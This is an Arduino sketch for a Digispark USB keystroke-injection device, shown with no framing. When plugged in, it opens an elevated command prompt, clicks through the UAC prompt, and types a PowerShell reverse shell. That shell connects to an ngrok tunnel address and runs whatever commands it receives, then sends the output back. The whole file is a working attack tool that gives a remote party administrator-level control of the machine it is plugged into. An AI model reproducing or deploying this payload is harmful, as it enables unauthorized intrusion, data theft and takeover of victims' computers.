#include "DigiKeyboard.h"
#define KEY_TAB 0x2b

void setup() {
    DigiKeyboard.delay(500);
    pinMode(1, OUTPUT);
}

void StartAdminCMD(){
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell  Start-Process cmd -Verb runAs");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  StartAdminCMD();
  DigiKeyboard.delay(1000);
  DigiKeyboard.println(F("powershell -command \"$client = New-Object System.Net.Sockets.TCPClient('0.tcp.sa.ngrok.io',14185);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd) + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"")); 
  DigiKeyboard.delay(5000);
  digitalWrite(1, HIGH); 
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
